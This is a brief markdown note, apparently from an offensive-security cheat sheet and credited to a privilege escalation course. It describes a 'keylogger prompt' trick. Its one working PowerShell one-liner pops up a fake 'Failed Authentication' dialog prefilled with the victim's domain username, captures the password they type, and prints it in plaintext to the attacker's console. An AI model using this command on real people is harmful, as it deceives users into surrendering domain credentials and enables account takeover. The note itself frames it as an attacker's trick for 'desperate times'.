# Bonus Tricks

### Keylogger prompt

This is a neat trick that can be used during desperate times. It will spawn a UI prompt that will ask for the user's domain credentials using environment variables to pull the username, then display the password in plaintext to the attacker console. 

From a CMD.exe prompt:
`powershell "$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+[Environment]::UserName,[Environment]::UserDomainName); $cred.getnetworkcredential().password"`

- from Sektor7 Privilege Escalation course